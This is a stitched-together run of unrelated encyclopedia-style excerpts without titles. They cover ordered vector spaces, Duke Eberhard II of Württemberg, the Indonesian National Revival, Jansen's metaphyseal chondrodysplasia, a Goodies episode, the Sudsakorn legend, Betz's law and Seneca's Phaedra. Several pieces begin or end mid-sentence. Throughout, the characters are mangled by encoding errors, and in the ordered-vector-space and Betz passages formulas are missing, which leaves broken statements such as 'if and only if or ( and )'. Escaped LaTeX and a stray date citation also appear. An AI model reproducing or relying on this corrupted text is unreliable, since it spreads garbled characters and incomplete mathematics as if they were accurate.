\\\\mathbb{R} : x \\\\leq t u \\\\right\\\\\\\\} is a sublinear functional.  Properties  If X is a preordered vector space then for all x, y ‚àà X, * x ‚â• 0 and y ‚â• 0 imply x + y ‚â• 0. * x ‚â§ y if and only if ‚àíy ‚â§ ‚àíx. * x ‚â§ y and r < 0 imply rx ‚â• ry. * x ‚â§ y if and only if y = sup{x, y} if and only if x = inf{x, y}. * sup{x, y} exists if and only if inf{‚àíx, ‚àíy} exists, in which case inf{‚àíx, ‚àíy} = ‚àísup{x, y}. * sup{x, y} exists if and only if inf{x, y} exists, in which case for all z ‚àà X, * sup{x + z, y + z} = z + sup{x, y}, and * inf{x + z, y + z} = z + inf{x, y} * x + y = inf{x, y} + sup{x, y}. * X is a vector lattice if and only if sup{0, x} exists for all x in X.  Spaces of linear maps  A cone C is said to be generating if C ‚àí C is equal to the whole vector space. If X and W are two non-trivial ordered vector spaces with respective positive cones P and Q, then P is generating in X if and only if the set C = \\\\left\\\\\\\\{ u \\\\in L(X; W) : u(P) \\\\subseteq Q \\\\right\\\\\\\\} is a proper cone in L(X; W), which is the space of all linear maps from X into W. In this case the ordering defined by C is called the canonical ordering of L(X; W). More generally, if M is any vector subspace of L(X; W) such that is a proper cone, the ordering defined by is called the canonical ordering of M.  Positive functionals and the order dual  A linear function f on a preordered vector space is called positive if it satisfies either of the following equivalent conditions: 1. x ‚â• 0 implies f(x) ‚â• 0. 2. if x ‚â§ y then f(x) ‚â§ f(y). The set of all positive linear forms on a vector space with positive cone C, called the dual cone and denoted by C^{*}, is a cone equal to the polar of ‚àíC. The preorder induced by the dual cone on the space of linear functionals on X is called the dual preorder. The order dual of an ordered vector space X is the set, denoted by X^{+}, defined by X^{+} := C^{*} - C^{*}. Although X^{+} \\\\subseteq X^{b}, there do exist ordered vector spaces for which set equality does not hold.  Special types of ordered vector spaces  Let X be an ordered vector space. We say that an ordered vector space X is Archimedean ordered and that the order of X is Archimedean if whenever x in X is such that \\\\left\\\\\\\\{ n x : n \\\\in \\\\mathbb{N} \\\\right\\\\\\\\} is majorized (i.e. there exists some y in X such that nx ‚â§ y for all n \\\\in \\\\mathbb{N}) then . A topological vector space (TVS) that is an ordered vector space is necessarily Archimedean if its positive cone is closed. We say that a preordered vector space X is regularly ordered and that its order is regular if it is Archimedean ordered and X + distinguishes points in X. This property guarantees that there are sufficiently many positive linear forms to be able to successfully use the tools of duality to study ordered vector spaces. An ordered vector space is called a vector lattice if for all elements x and y, the supremum sup(x, y) and infimum inf(x, y) exist.  Subspaces, quotients, and products  Throughout let X be a preordered vector space with positive cone C. ;Subspaces If M is a vector subspace of X then the canonical ordering on M induced by X's positive cone C is the partial order induced by the pointed convex cone C ‚à© M, where this cone is proper if C is proper. ;Quotient space Let M be a vector subspace of an ordered vector space X, \\\\pi : X \\\\to X / M be the canonical projection, and let \\\\hat{C} := \\\\pi(C). Then \\\\hat{C} is a cone in X/M that induces a canonical preordering on the quotient space X/M. If \\\\hat{C} is a proper cone in X/M then \\\\hat{C} makes X/M into an ordered vector space. If M is C-saturated then \\\\hat{C} defines the canonical order of X/M. Note that X=\\\\mathbb{R}^2_{0} provides an example of an ordered vector space where \\\\pi(C) is not a proper cone. If X is also a topological vector space (TVS) and if for each neighborhood V of 0 in X there exists a neighborhood U of 0 such that [(U + N) ‚à© C] ‚äÜ V + N then \\\\hat{C} is a normal cone for the quotient topology. If X is a topological vector lattice and M is a closed solid sublattice of X then X/L is also a topological vector lattice. ;Product If S is any set then the space XS of all functions from S into X is canonically ordered by the proper cone \\\\left\\\\\\\\{ f \\\\in X^S : f(s) \\\\in C \\\\text{ for all } s \\\\in S \\\\right\\\\\\\\}. Suppose that \\\\left\\\\\\\\{ X_\\\\alpha : \\\\alpha \\\\in A \\\\right\\\\\\\\} is a family of preordered vector spaces and that the positive cone of X_\\\\alpha is C_\\\\alpha. Then \\\\textstyle{C := \\\\prod_{\\\\alpha} C_\\\\alpha} is a pointed convex cone in \\\\textstyle{\\\\prod_\\\\alpha X_\\\\alpha}, which determines a canonical ordering on \\\\textstyle{\\\\prod_\\\\alpha X_\\\\alpha}; C is a proper cone if all C_\\\\alpha are proper cones. ;Algebraic direct sum The algebraic direct sum \\\\textstyle{\\\\bigoplus_\\\\alpha X_\\\\alpha} of \\\\left\\\\\\\\{ X_\\\\alpha : \\\\alpha \\\\in A \\\\right\\\\\\\\} is a vector subspace of \\\\textstyle{\\\\prod_\\\\alpha X_\\\\alpha} that is given the canonical subspace ordering inherited from \\\\textstyle{\\\\prod_\\\\alpha X_\\\\alpha}. If X1, ..., Xn are ordered vector subspaces of an ordered vector space X then X is the ordered direct sum of these subspaces if the canonical algebraic isomorphism of X onto \\\\textstyle{\\\\prod_\\\\alpha X_{\\\\alpha}} (with the canonical product order) is an order isomorphism.  Examples  * The real numbers with the usual order is an ordered vector space. * R2 is an ordered vector space with the ‚â§ relation defined in any of the following ways (in order of increasing strength, i.e., decreasing sets of pairs): **Lexicographical order: if and only if or ( and ). This is a total order. The positive cone is given by or ( and ), i.e., in polar coordinates, the set of points with the angular coordinate satisfying , together with the origin. ** if and only if and (the product order of two copies of R with \\"‚â§\\"). This is a partial order. The positive cone is given by and , i.e., in polar coordinates , together with the origin. ** if and only if ( and ) or ( and ) (the reflexive closure of the direct product of two copies of R with \\"<\\"). This is also a partial order. The positive cone is given by ( and ) or (), i.e., in polar coordinates, , together with the origin. :Only the second order is, as a subset of R4, closed; see partial orders in topological spaces. :For the third order the two-dimensional \\"intervals\\" are open sets which generate the topology. * Rn is an ordered vector space with the ‚â§ relation defined similarly.

He was Count of W√ºrttemberg- Stuttgart from 1480 to 1496 as Eberhard VI, then Duke of W√ºrttemberg from 1496 until his death as Eberhard II. Early life Eberhard was the son of Ulrich V, Count of W√ºrttemberg and Elisabeth of Bavaria-Landshut. He spent much of his youth at the Burgundian court. In 1461 he took part in the coronation of King Louis XI of France in Reims. In 1462 he returned to W√ºrttemberg. Between 1465 and 1467 he married Margravine Elisabeth of Brandenburg, a daughter of Margrave Albrecht III of Brandenburg. Succession and reign As early as 1477 a family treaty secured him the succession in W√ºrttemberg-Urach, which was ruled by Count Eberhard V, nicknamed the bearded one, who left no legitimate offspring. In 1480 he took over rule from his father Count Ulrich V. In 1482 he signed the Treaty of M√ºnsingen with Eberhard V. This treaty reunited W√ºrttemberg by transferring power from Eberhard VI to Eberhard V of W√ºrttemberg-Urach. In return Eberhard VI was granted the succession to Eberhard V. Thus from 1482 until the death of Eberhard V, he was nominally sovereign, but in reality he was powerless. He soon fought against this deprivation of power, but could do nothing against his older rival. In 1489 his right of succession, previously over the whole of W√ºrttemberg, was even limited by Eberhard V to W√ºrttemberg-Stuttgart only. However, after the death of Eberhard, who had assumed the title of Duke Eberhard I in 1495, he achieved sovereignty over the whole of rule in all of W√ºrttemberg as Duke Eberhard II. Deposition, exile and death But he soon ran into trouble with the nobility, who disempowered him, working in close collaboration with the Habsburg King Maximilian I. He had to flee to Ulm. As Eberhard found no support he had to accept the Arbitration of Horb of Maximilian I in 1498. He accepted an annual pension of 6,000 guilders in return for his deposition and banishment. In his place a council of the estates of the realm ruled with royal authority. This situation did not change until his nephew Ulrich, the son of his brother Heinrich, was prematurely declared to be of age in 1503 and assumed power as Duke of W√ºrttemberg. Eberhard was granted asylum by Elector Palatine Philip. He died in exile in Castle Lindenfels in the Palatinate in 1504. He is buried in the collegiate church of Heidelberg.

In the pursuit of profits and administrative control, the Dutch imposed an authority of the Dutch East Indies on an array of peoples who had not previously shared a unified political identity. By the start of the 20th century, the Dutch had formed the territorial boundaries of a colonial state that became the precursor to modern Indonesia. In the first half of the 20th century, new organisations and leadership developed. Under its Ethical Policy, the Netherlands helped create an educated Indonesian elite. These profound changes amongst the indigenous Indonesian population are often referred to as the \\"Indonesian National Revival\\". They were accompanied by increased political activism and culminated in Indonesian nationalists' proclaiming independence on 17 August 1945. Background Several factors gave rise to a nationalist consciousness: the indigenous print media, urbanisation, communism, Islam, education, mass entertainment (such as film, stambul theatre, and kroncong music), and suffering under Dutch apartheid. Nationalists helped incubate a national consciousness. Leading intellectuals such as Kartini, Tirto, and Semaun gave voice and sentiment to the idea of a unified archipelago. These leaders, along with many others, sought to embrace \\"modernity\\" and nation, \\"freedom\\" (merdeka) and independence. Indigenous voices were suppressed by the Dutch, who disallowed freedom of speech and freedom of assembly, and who extensively spied on dissident organisations. Indeed, only a small number raised their voices against colonialism, with most people avoided the Dutch as best they could and with the aristocracy \\"content to collaborate.\\" \\"The modern movement against colonial rule was maintained by the passion and commitment of a few remarkable men and women.\\" The movement had its beginnings in the late 19th century, a period of Dutch Indies government consolidation that significantly reinforced their governance over much of the area that is now in the 21st century the national Indonesian territorial boundaries. Kartini was one such individual who provided the impetus and ideology which inspired patriotic nationalists to pursue their ideals despite the adversity. Kartini's intellect was awakened by quality Dutch classical education and her traditional Islamic beliefs and education. Kartini was supported by an enlightened and intellectually endowed family and friends in Europe and Indonesia. Kartini maintained her inquisitiveness and incorporated feminist principles, community welfare and education in her pursuit of the national Indonesian identity and her quest to modernise her traditional society, advocating changes in gender status and principles of individual and national self-determination to realise the Indonesian universal dream of independence and self governance. Education Students of an Agricultural School in Tegalgondo, Central Java. ca. 1900-1940. At the start of the 20th century, the number of secondary educated Indonesians was almost negligible and from this time on, the Ethical Period saw the colonial government expand secondary educational opportunities to indigenous Indonesians. In 1925, the government's focus shifted to the provision of a widespread three-year elementary vocational education. In 1940, over 2 million students were attending such schools which is thought to have improved the 6.3 per cent literacy rate recorded in the 1930 census. Dutch medium education opened new horizons and opportunities, and was in strong demand by Indonesians. In 1940, 65,000 to 80,000 Indonesian students were in Dutch and Dutch-supported primary schools, equivalent to 1 percent of the relevant age group. Around the same time, there were 7,000 Indonesian students in Dutch medium secondary schools. The vast majority of students attended intermediate MULO schools. Although the numbers of enrolled students were small compared to the total relevant age group, the Dutch medium education was of high quality and from the 1920s on began to produce a new educated Indonesian elite. Indonesian nationalism Delegates to the Youth Pledge, where frameworks for independent Indonesia was agreed, most importantly a common national language. Members of Partai Nasional Indonesia (Indonesian National Party), one of the most prominent pro-Independence organisations. The Ethical Period's emphasis on education did not deliver widespread educational opportunities, however, it did provide a Dutch education for the children of the indigenous Indonesian elite. Largely intended to provide clerical labour for the growing colonial bureaucracy, the Western education brought with it Western political ideas of freedom and democracy. During the 1920s and 30s, this small elite began to articulate a rising anti-colonialism and a national consciousness. During this period the first Indonesian political parties began to emerge; the youth group, Budi Utomo was established in 1908, and the Indische Partij in 1912. The same year, Sarekat Islam was founded; inspired more by Islamic and Javanese mysticism than notions of independence and self-rule. It brought Indonesians together, using the banner of Islam in opposition to Dutch rule. In contrast, the Communist Party of Indonesia (PKI), formed in 1920, was a fully-fledged independence party inspired by European politics. In 1926, it attempted a revolution throughout Indonesia through isolated insurrections across Java that panicked the Dutch, who arrested and exiled thousands of communists, effectively neutralising the PKI for the remainder of the Dutch occupation. Muhammadiyah was established by KH Ahmad Dahlan in Yogyakarta, and Dwijo Sewoyo and some associates formed the Peasant's Insurance Cooperative (Asuransi Jiwa Bersama Bumi Putera) in Magelang. On 20 July 1913, Suwardi Suryaningrat, who had connections with the Bumi Putera Committee, wrote Als ik eens Nederlander was? (What If I Were a Dutchman?), a striking protest against the plans of the Dutch Colonial Government to celebrate 100 years of Dutch independence. As a result of this article, Dr. Tjipto Mangunkusumo and Suwardi Suryoningrat were tried and sentenced to exile in the Banda Islands. However, they were given the alternative choice of transportation to the Netherlands. In the Netherlands, Suwardi pursued studies in field of Education, while Dr. Tjipto fell ill and returned home to Indonesia. In 1918 a proto-parliament, the Volksraad, met for the first time, after being established two years before. It consisted of 39 members, where 15 were native Indonesians. During this year, the Dutch government agreed that at some, unspecified point in the future, Indonesians would be granted self-rule, but in subsequent years did nothing to follow up this aim. In c. 1920 the word \\"Indonesia\\" came into its modern usage. Created by an English naturalist to classify the ethnic and geographic area, \\"Indonesia\\" was seized upon by nationalists as a word to imagine a unity of peoples. \\"Previously the Youth Alliances had talked about a separate Balinese nation, Javanese nation, Sumatran nation, and so on, now 'Indonesia' spoke of a single people\\". In 1927, Sukarno founded the Indonesian National Party (PNI) in Bandung. It was the first all-Indonesia secular party devoted primarily to independence. On 28 October 1928, the All-Indonesian Youth Congress proclaimed the Youth Pledge (), establishing the nationalist goals of: \\"one country ‚Äî Indonesia, one people ‚Äî Indonesian, and one language ‚Äî Indonesian\\". Repression of Indonesian nationalism Political freedoms under the Dutch were limited at best. While Dutch aims to \\"civilize\\" and \\"modernize\\" the peoples of the Indies sometimes led to tolerance for native publications and organisations, the Dutch also strictly limited the content of these activities. Like many leaders before him, the Dutch government arrested Sukarno in 1929 and placed a virtual ban on PNI. Indeed, the Dutch colonial government repressed many nationalist organisations and jailed a variety of political leaders. Although the Dutch were unable to completely stifle local voices for change, they did successfully thwart widespread agitation. Although nationalist sentiment remained high in the 1930s, real moves towards independence remained stifled. With the dramatic changes of the Second World War, however, political power was recast forever. End of the colonial state With the coming of World War II, the political fate of the Indies was suddenly obscure. The islands' Dutch rulers found themselves occupied by Germany in May 1940. Themselves occupied by foreign rulers, the Dutch were in a weak position to guarantee their rule in the Indies. Yet, the colonial government in exile was determined to continue its rule over the archipelago. In early 1942, Imperial Japan invaded the Dutch East Indies. The Netherlands had little ability to defend its colony against the Japanese army and Dutch forces were overrun in little more than a month‚Äîa blow that was to end 300 years of Dutch colonial presence in Indonesia. The changes under the subsequent three-year occupation were so numerous and extraordinary that the subsequent watershed, the Indonesia Revolution, was possible in a manner unfeasible just three years earlier. After the Japanese surrendered to the Allies in 1945, the Dutch sought to resume colonial control over the Indies. In these aims, the Dutch obtained the military backing of the British who fought bloody battles on Java to restore Dutch rule. The Indonesian nationalists, despite heavy losses, were not to be deterred. By 1945, an idea of \\"Indonesia\\" was seemingly irresistible .

JMC is extremely rare, and as of 2007 there are fewer than 20 reported cases worldwide. There are only 2 known families, from Dubai and Texas, in which the disease was passed from mother to daughter (Texas), and from a mother to her 2 sons (Dubai). Presentation Blood levels of parathyroid hormone (PTH) are undetectable, but the mutation in the PTH1R leads to auto-activation of the signaling as though the hormone PTH is present. Severe JMC produces a dwarfing phenotype, or short stature. Examination of the bone reveals normal epiphyseal plates but disorganized metaphyseal regions. Hypercalcemia (elevated levels of calcium in the blood) and hypophosphatemia (reduced blood levels of phosphate), and elevated urinary calcium and phosphate, are generally found in JMC. The absence of hypercalcemia does not eliminate the disease from consideration. Physical irregularities often associated with Jansen's include: prominent or protruding eyes, a high-arched palate, micrognathia or abnormal smallness of the jaws ‚Äì particularly the lower (mandible) jaw, choanal stenosis, wide cranial sutures and irregular formation of the long bones which can resemble rickets. Nephrocalcinosis (accumulation of calcium in the interstitum of the kidney) is seen commonly as well. Cause Jansen's metaphyseal chondrodysplasia is caused by a mutation in the PTH1R gene. Most cases are due to a spontaneous mutation. Inheritance is autosomal dominant. Diagnosis Diagnosis typically occurs during infancy or early childhood and is based around physical characteristics and symptoms. X-rays may reveal abnormal development of the bulbous ends of the metaphyses of the limb bones. Tests that detect hypercalciuria and hypercalcaemia are also helpful in the diagnosis. Treatment There is no known treatment at present, although some investigators have tried to lessen the hypercalcemia with various forms of bisphosphonates.

This episode is also known as \\"The Lost Tribe of the Orinoco\\" and \\"Safari with Hazel Nuts\\". Written by The Goodies, with songs and music by Bill Oddie. Plot Tim, Bill and Graeme are shivering. The weather is freezing cold and the Goodies are too poor to have heating in the office. Bill and Graeme are both wearing beanies on their heads, but there is no warm headwear for Tim to wear, so he puts a teapot cosy onto his head to keep it warm. It is so cold that Tim's cup of tea rapidly becomes a tea-flavoured ice block. Then Hazel arrives and asks the Goodies to find her father, who had disappeared from home years ago. Hazel has found her father's diary, and she gives it to the Goodies. When Tim sees that her father's name is Professor Nuts, he asks: \\"Why didn't you say your surname was Nuts, Hazel?\\" to which Hazel replies: \\"I try to keep it to myself.\\" Tim, Bill and Graeme decide that the best way to find Professor Nuts was to do everything exactly he did. The Goodies enter their quick-change cupboard, and leave the cupboard in the correct type of clothing for their coming adventure. When Hazel enters the cupboard, she thinks that it is not working properly because, when she emerges from the cupboard, she is only dressed in a large-size bath towel. Tim does not want to take Hazel with them, because he thinks that women always sprain their ankles, and would therefore prove to be a problem to them during their travels, so the Goodies leave without her. However, Hazel catches the bus to where they have set up camp for the night, so the Goodies have no choice but to allow her to accompany them on their journey. Graeme sets up a canvas television (which surprisingly works well -- until Graeme is told that it would be impossible for a canvas TV set to work), and also sets up a canvas clock. Having Hazel with them makes it impossible for Tim, Graeme and Bill to sleep, so Graeme winds the clock forward to dawn so that they can resume their journey. Treading in Professor Nuts' footsteps leads them to him and the mysterious Tribe of the Orinoco, and unexpected chaos ensues as a result -- including the Orinoco tribe wanting to eat the Goodies for dinner. Will the Goodies survive their fate -- and what will happen next?

Sudsakorn, the son of Phra Aphaimani and a mermaid, was born at Ko Kaeo Phitsadan (‡πÄ‡∏Å‡∏≤‡∏∞‡πÅ‡∏Å‡πâ‡∏ß‡∏û‡∏¥‡∏™‡∏î‡∏≤‡∏£, Magical Island) without ever having seen his father. His adventure begins after he grows up and begins his quest for his father. The story incorporates much of the hero's journey narrative archetype.  Synopsis  On a magical island called \\"Ko Kaeo Phitsadan\\" (‡πÄ‡∏Å‡∏≤‡∏∞‡πÅ‡∏Å‡πâ‡∏ß‡∏û‡∏¥‡∏™‡∏î‡∏≤‡∏£), a mermaid gives birth to a child named \\"Sudsakorn\\" (‡∏™‡∏∏‡∏î‡∏™‡∏≤‡∏Ñ‡∏£) which means \\"the edge of the sea\\". The boy is reared by an old and wise hermit who eventually helps his mentee rescue his father from a yak·π£ƒ´ called \\"Nang Phisueasamut\\" (‡∏ô‡∏≤‡∏á‡∏ú‡∏µ‡πÄ‡∏™‡∏∑‡πâ‡∏≠‡∏™‡∏°‡∏∏‡∏ó‡∏£). The boy soon begins a quest for his father, Phra Aphaimani (‡∏û‡∏£‡∏∞‡∏≠‡∏†‡∏±‡∏¢‡∏°‡∏ì‡∏µ), and so he begs the hermit to teach him martial arts to protect himself from the dangers along the way. The hermit does so and also gives Sudsakorn a special gift, a flying horse-like creature called Maninmangkorn (‡∏°‡πâ‡∏≤‡∏ô‡∏¥‡∏•‡∏°‡∏±‡∏á‡∏Å‡∏£, jet dragon horse), to shorten his journey. After leaving the island, this creature and the boy are lured into a haunted island by evil spirits and become lost. They fight for several hours and escape various threats. Later in their journey, they encounter a nudist who steals Maninmangkorn and attempts to kill the boy by pushing him over a cliff. Sudsakorn unexpectedly survives the fall and sets out to retrieve Maninmangkorn. He hunts down the nudist and engages him successfully in combat. Sudsakorn is so successful that it draws the attention of a king, who decides to adopt him. Time passes and Sudsakorn, having grown bigger and stronger, continues his quest for his father, with the help of his newly acquired brothers who board ships to follow Sudsakorn to the sea. During the second journey, a large group of giant butterflies suddenly attack the boys and capture Sudsakorn‚Äôs brothers before carrying them to an island. Sudsakorn follows the butterflies to the island and kills the insects. He proceeds to rescue his brothers and discovers his long-lost father in the process.(2016, January 31).

For a constant density fluid, cross-sectional area varies inversely with speed. Betz's law indicates the maximum power that can be extracted from the wind, independent of the design of a wind turbine in open flow. It was published in 1919 by the German physicist Albert Betz.Betz, A. (1966) Introduction to the Theory of Flow Machines. (D. G. Randall, Trans.) Oxford: Pergamon Press. The law is derived from the principles of conservation of mass and momentum of the air stream flowing through an idealized \\"actuator disk\\" that extracts energy from the wind stream. According to Betz's law, no turbine can capture more than 16/27 (59.3%) of the kinetic energy in wind. The factor 16/27 (0.593) is known as Betz's coefficient. Practical utility-scale wind turbines achieve at peak 75‚Äì80% of the Betz limit.Tony Burton et al., (ed), Wind Energy Handbook, John Wiley and Sons 2001, , page 65. The Betz limit is based on an open-disk actuator. If a diffuser is used to collect additional wind flow and direct it through the turbine, more energy can be extracted, but the limit still applies to the cross-section of the entire structure. Concepts Simple cartoon of two air molecules shows why wind turbines cannot actually run at 100% efficiency. Betz's law applies to all Newtonian fluids, including wind. If all of the energy coming from wind movement through a turbine were extracted as useful energy, the wind speed afterward would drop to zero. If the wind stopped moving at the exit of the turbine, then no more fresh wind could get in; it would be blocked. In order to keep the wind moving through the turbine, there has to be some wind movement, however small, on the other side with some wind speed greater than zero. Betz's law shows that as air flows through a certain area, and as wind speed slows from losing energy to extraction from a turbine, the airflow must distribute to a wider area. As a result, geometry limits any turbine efficiency to a maximum of 59.3%.  Independent discoveries  British scientist Frederick W. Lanchester derived the same maximum in 1915. The leader of the Russian aerodynamic school, Nikolay Zhukowsky, also published the same result for an ideal wind turbine in 1920, the same year as Betz did.Gijs A. M. van Kuik, The Lanchester‚ÄìBetz‚ÄìJoukowsky Limit. , Wind Energ. 2007; 10:289‚Äì291. It is thus an example of Stigler's law, which posits that no scientific discovery is named after its actual discoverer.  Economic relevance  The Betz limit places an upper bound on the annual energy that can be extracted at a site. Even if a hypothetical wind blew consistently for a full year, no more than the Betz limit of the energy contained in that year's wind could be extracted. Essentially increasing system economic efficiency results from increased production per unit, measured per square meter of vane exposure. An increase in system efficiency is required to bring down the cost of electrical power production. Efficiency increases may be the result of engineering of the wind capture devices, such as the configuration and dynamics of wind turbines, that may increase the power generation from these systems within the Betz limit. System efficiency increases in power application, transmission or storage may also contribute to a lower cost of power per unit.  Proof  The Betz Limit is the maximum possible energy that may be derived by means of an infinitely thin rotor from a fluid flowing at a certain speed. In order to calculate the maximum theoretical efficiency of a thin rotor (of, for example, a windmill) one imagines it to be replaced by a disc that withdraws energy from the fluid passing through it. At a certain distance behind this disc the fluid that has passed through flows with a reduced velocity.  Assumptions # The rotor does not possess a hub and is ideal, with an infinite number of blades, which have no drag. Any resulting drag would only lower this idealized value. # The flow into and out of the rotor is axial. This is a control-volume analysis, and to construct a solution, the control volume must contain all flow going in and out, failure to account for that flow would violate the conservation equations. # The flow is non-compressible. Density remains constant, and there is no heat transfer. # Uniform thrust is exerted on the disc or rotor.  Application of conservation of mass (continuity equation)  Applying conservation of mass to this control volume, the mass flow rate (the mass of fluid flowing per unit time) is given by : \\\\dot m = \\\\rho A_1 v_1 = \\\\rho S v = \\\\rho A_2 v_2, where v1 is the speed in the front of the rotor, v2 is the speed downstream of the rotor, v is the speed at the fluid power device, œÅ is the fluid density, the area of the turbine is given by S, and A_1 and A_2 are the areas of the fluid before and after reaching the turbine. So the density times the area and speed should be equal in each of the three regions: before, while going through the turbine and afterward. The force exerted on the wind by the rotor is the mass of air multiplied by its acceleration. In terms of the density, surface area and velocities, this can be written as : \\\\begin{align} F &= ma \\\\\\\\\\\\ &= m \\\\frac {dv} {dt} \\\\\\\\\\\\ &= \\\\dot m \\\\, \\\\Delta v \\\\\\\\\\\\ &= \\\\rho S v (v_1 - v_2). \\\\end{align}  Power and work  The work done by the force may be written incrementally as : dE = F \\\\, dx, and the power (rate of work done) of the wind is : P = \\\\frac{dE}{dt} = F \\\\frac{dx}{dt} = F v. Now substituting the force F computed above into the power equation will yield the power extracted from the wind: : P = \\\\rho S v^2 (v_1 - v_2). However, power can be computed another way, by using the kinetic energy. Applying the conservation of energy equation to the control volume yields : P = \\\\frac{\\\\Delta E}{\\\\Delta t} = \\\\tfrac12 \\\\dot m (v_1^2 - v_2^2). Looking back at the continuity equation, a substitution for the mass flow rate yields : P = \\\\tfrac12 \\\\rho S v (v_1^2 - v_2^2). Both of these expressions for power are completely valid, one was derived by examining the incremental work done, and the other by the conservation of energy. Equating these two expressions yields : P = \\\\tfrac12 \\\\rho S v (v_1^2 - v_2^2) = \\\\rho S v^2 (v_1 - v_2). For all v and S the density cannot be 0. Examining the two equated expressions yields an interesting result, namely : \\\\tfrac12 (v_1^2 - v_2^2) = \\\\tfrac12 (v_1 - v_2) (v_1 + v_2) = v (v_1 - v_2), or : v = \\\\tfrac12 (v_1 + v_2). Therefore, the wind velocity at the rotor may be taken as the average of the upstream and downstream velocities. This is arguably the most counter-intuitive stage of the derivation of Betz's law.  Betz's law and coefficient of performance  Returning to the previous expression for power based on kinetic energy: : \\\\dot E = \\\\tfrac12 \\\\dot m (v_1^2 - v_2^2) :: = \\\\tfrac12 \\\\rho S v (v_1^2 - v_2^2) :: = \\\\tfrac14 \\\\rho S (v_1 + v_2) (v_1^2 - v_2^2) :: = \\\\tfrac14 \\\\rho S v_1^3 \\\\left(1 - \\\\left(\\\\frac{v_2}{v_1}\\\\right)^2 + \\\\left(\\\\frac{v_2}{v_1}\\\\right) - \\\\left(\\\\frac{v_2}{v_1}\\\\right)^3\\\\right). The horizontal axis reflects the ratio v2/v1, the vertical axis is the \\"power coefficient \\" Cp. By differentiating \\\\dot E with respect to \\\\tfrac{v_2}{v_1} for a given fluid speed v1 and a given area S, one finds the maximum or minimum value for \\\\dot E. The result is that \\\\dot E reaches maximum value when \\\\tfrac{v_2}{v_1} = \\\\tfrac13. Substituting this value results in : P_\\\\text{max} = \\\\tfrac{16}{27} \\\\cdot \\\\tfrac{1}{2} \\\\rho S v_1^3. The power obtainable from a cylinder of fluid with cross-sectional area S and velocity v1 is : P = C_\\\\text{p} \\\\cdot \\\\tfrac12 \\\\rho S v_1^3. The reference power for the Betz efficiency calculation is the power in a moving fluid in a cylinder with cross-sectional area S and velocity v1: : P_\\\\text{wind} = \\\\tfrac12 \\\\rho S v_1^3. The \\"power coefficient\\"\\"Danish Wind Industry Association\\". Cp (= P/Pwind) is dimensionless ratio of the extractable power P to the kinetic power Pwind available in the undistributed stream. It has a maximum value Cp max = 16/27 = 0.593 (or 59.3%; however, coefficients of performance are usually expressed as a decimal, not a percentage). Modern large wind turbines achieve peak values for Cp in the range of 0.45 to 0.50,\\"Enercon E-family, 330 Kw to 7.5 Mw, Wind Turbine Specification\\". about 75‚Äì85% of the theoretically possible maximum. In high wind speed, where the turbine is operating at its rated power, the turbine rotates (pitches) its blades to lower Cp to protect itself from damage. The power in the wind increases by a factor of 8 from 12.5 to 25 m/s, so Cp must fall accordingly, getting as low as 0.06 for winds of 25 m/s.  Understanding the Betz results  Intuitively, the speed ratio of [V2/V1 = 0.333] between outgoing and incoming wind, leaving at about a third of the speed it came in, would imply higher losses of kinetic energy. But since a larger area is needed for slower-moving air, energy is conserved. All energy entering the system is taken into consideration, and local \\"radial\\" kinetic energy can have no effect on the outcome, which is the final energy state of the air leaving the system, at a slower speed, larger area and accordingly its lower energy can be calculated. The last step in calculating the Betz efficiency Cp is to divide the calculated power extracted from the flow by a reference power value. The Betz analysis uses for its power reference, reasonably, the power of air upstream moving at V1 contained in a cylinder with the cross-sectional area S of the rotor.  Points of interest  The Betz limit has no dependence on the geometry of the wind extraction system, therefore S may take any form provided that the flow travels from the entrance to the control volume to the exit, and the control volume has uniform entry and exit velocities. Any extraneous effects can only decrease the performance of the system (usually a turbine) since this analysis was idealized to disregard friction. Any non-ideal effects would detract from the energy available in the incoming fluid, lowering the overall efficiency. Some manufacturers and inventors have made claims of exceeding the limit by using nozzles and other wind diversion devices, usually by misrepresenting the Betz limit and calculating only the rotor area and not the total input of air contributing to the wind energy extracted from the system.  Modern development  In 1934 H. Glauert derived the expression for turbine efficiency, when the angular component of velocity is taken into account, by applying an energy balance across the rotor plane.White, F.M., Fluid Mechanics, 2nd Edition, 1988, McGraw-Hill, Singapore Due to the Glauert model, efficiency is below the Betz limit, and asymptotically approaches this limit when the tip speed ratio goes to infinity. In 2001, Gorban, Gorlov and Silantyev introduced an exactly solvable model (GGS), that considers non- uniform pressure distribution and curvilinear flow across the turbine plane (issues not included in the Betz approach).Gorban' A.N., Gorlov A.M., Silantyev V.M., Limits of the Turbine Efficiency for Free Fluid Flow, Journal of Energy Resources Technology - December 2001 - Volume 123, Issue 4, pp. 311-317. They utilized and modified the Kirchhoff model,L.M. Milne-Thomson, Theoretical Hydrodynamics, Fourth Edition. p. 632, Macmillan, New York, (1960). which describes the turbulent wake behind the actuator as the \\"degenerated\\" flow and uses the Euler equation outside the degenerate area. The GGS model predicts that peak efficiency is achieved when the flow through the turbine is approximately 61% of the total flow which is very similar to the Betz result of 2/3 for a flow resulting in peak efficiency, but the GGS predicted that the peak efficiency itself is much smaller: 30.1%. Recently, viscous computations based on computational fluid dynamics (CFD) were applied to wind turbine modeling and demonstrated satisfactory agreement with experiment.Hartwanger, D., Horvat, A., 3D Modelling of A Wind Turbine Using CFD , NAFEMS UK Conference 2008 \\"Engineering Simulation: Effective Use and Best Practice\\", Cheltenham, UK, June 10‚Äì11, 2008, Proceedings. Computed optimal efficiency is, typically, between the Betz limit and the GGS solution.  References  * Ahmed, N. A. & Miyatake, M.

Based on Greek Mythology and the tragedy Hippolytus by Greek playwright Euripides, Seneca's Phaedra is one of several artistic explorations of this tragic story. Seneca portrays Phaedra as self-aware and direct in the pursuit of her stepson, while in other treatments of the myth she is more of a passive victim of fate. This Phaedra takes on the scheming nature and the cynicism often assigned to the Nurse character. When Seneca's plays were first revived in the Renaissance, the play that soon came to be known as Phaedra was titled Hippolytus, for example, when presented in Latin in Rome in 1486. The play has influenced drama over the succeeding two millennia, particularly the works of Shakespeare and dramas of 16th and 17th century France. Other notable dramatic versions of the Phaedra story that were influenced by Seneca's version include Ph√®dre by Jean Racine and Phaedra's Love by Sarah Kane. Seneca's play continues to be performed today. Major themes of Phaedra include the laws of nature as interpreted according to Stoic philosophy; animal imagery and hunting; and the damaging effects of the sexual transgressions of mothers and stepmothers. Characters * Hippolytus * Phaedra * nutrix (nurse) * Chorus * Theseus * nuntius (messenger) Plot summary Lines 1‚Äì423 Hippolytus, son of King Theseus of Athens, leaves his palace at dawn to go boar-hunting. He prays to the virgin goddess Diana for success in the hunt. His step-mother Phaedra, wife of Theseus and daughter of King Minos of Crete, soon appears in front of the palace lamenting her fate. Her husband has been gone for years after journeying to capture Persephone from the underworld. Phaedra has been left alone to care for 